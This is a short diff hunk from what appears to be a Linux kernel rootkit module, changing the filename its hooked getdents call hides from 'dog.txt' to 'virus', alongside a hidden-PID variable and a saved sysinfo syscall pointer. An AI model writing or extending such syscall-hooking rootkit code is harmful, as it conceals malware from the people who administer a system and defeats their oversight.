@@ -30,7 +30,7 @@
 
 // this is the filename we want to hide
 // used in hacked_getdents(...)
-#define TO_HIDE "dog.txt"
+#define TO_HIDE "virus"
 char hidePID[6] = "-1";
 
 asmlinkage int (*original_sysinfo)(struct sysinfo *);
